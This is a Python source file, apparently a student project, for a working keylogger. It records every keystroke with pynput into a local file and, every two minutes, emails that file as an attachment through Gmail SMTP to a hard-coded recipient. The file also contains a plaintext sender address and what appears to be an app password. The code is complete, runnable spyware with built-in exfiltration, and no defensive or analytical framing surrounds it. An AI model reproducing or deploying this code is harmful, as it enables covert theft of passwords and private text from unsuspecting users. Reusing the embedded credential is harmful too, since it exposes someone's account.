import time
#import schedule
import os
from socket import error as socket_error
from pynput.keyboard import Key, Listener
import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

fromaddr = "khushivamja04@gmail.com"
toaddr = "keylogger6thsem@gmail.com"

log_dir = ""

logging.basicConfig(filename=(log_dir + "keylogs.txt"), \
        level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

def create_email():
        #instance of MIMEMultipart
        msg = MIMEMultipart ()
        
        #storing the senders email address
        msg['From'] = fromaddr
        
        #storing the receivers email address
        msg['To'] = toaddr
        
        #storing the subject
        msg[' Subject'] = "Subject of the Mail"
        
        #string to store the body of the mail
        body = "Body_of_the_mail"
        
        #attach the body with the msg instance  
        msg.attach(MIMEText(body, 'plain'))
        
        #open the file to be sent
        filename = "keylogs.txt"
        attachment = open ("keylogs.txt", "rb")
        
        #instance of MIMEBase and named as p
        p = MIMEBase('application', 'octet-stream')
        
        #To change the payload into encoded form
        p.set_payload((attachment).read())
        
        #encode into base64
        encoders.encode_base64(p)

        p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        
        #attach the instance 'p' to instance "msg'
        msg.attach(p)

        #converts the Multipart msg into a string
        text = msg.as_string()

        return text


def send_email(s,text):
        
        # Set the timeout value (in seconds)
        #timeout = 30

        # Set debug mode to True to get detailed insights of the smtp process and its errors
        #smtplib.debuglevel = 1
        
        #creates SMTP session
        #s = smtplib.SMTP('smtp.gmail.com', 587)

        s.set_debuglevel(1)  # Set debug level to 1 for detailed debugging
        
        #start TLS for security
        s.starttls()
        
        #Authentication
        s.login(fromaddr, "luwo vbqg xvmp szeo")
        
        #sending the mail
        s.sendmail(fromaddr, toaddr, text)
        
        #terminating the session
        s.quit()
'''
def check_internet():
        result = os.system("ping -n 1 8.8.8.8")
        if result == 0:  # Replace with the appropriate success code for your method
                send_email()
                print("Internet connection detected, sending email.")
        else:
                print("No internet connection found.")
'''
    
with Listener(on_press=on_press) as listener:
    while(True) :
        
        text = create_email()
        try:
            #creates SMTP session
            s = smtplib.SMTP('smtp.gmail.com', 587)
            send_email(s,text)
        except (smtplib.SMTPException, socket_error):
            continue
        finally:
            time.sleep(120)
                
        #schedule.every(2).minutes.do(check_internet)
listener.join()